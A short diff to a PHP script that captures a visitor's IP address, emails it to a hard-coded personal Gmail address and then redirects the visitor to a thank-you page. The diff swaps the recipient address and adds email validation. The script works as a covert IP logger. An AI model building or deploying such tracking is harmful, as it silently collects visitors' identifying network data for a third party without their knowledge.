@@ -17,11 +17,22 @@ function getUserIP()
     return $ip;
 }
 
+// Function to sanitize and validate the email address
+function sanitizeEmail($email)
+{
+    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
+    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        return $email;
+    } else {
+        return false;
+    }
+}
+
 // Get the user IP address
 $userIP = getUserIP();
 
 // Prepare the email message
-$to = 'teamgoogl8@gmail.com';
+$to = sanitizeEmail('geeert45@gmail.com');
 $subject = 'IP Address Retrieved';
 $message = 'The user IP address is: ' . $userIP;
 $headers = 'From: noreply@yourdomain.com' . "\r\n" .
@@ -29,7 +40,9 @@ $headers = 'From: noreply@yourdomain.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
 // Send the email
-mail($to, $subject, $message, $headers);
+if ($to !== false) {
+    mail($to, $subject, $message, $headers);
+}
 
 // Redirect the user to a thank you page
 header('Location: thankyou.php');
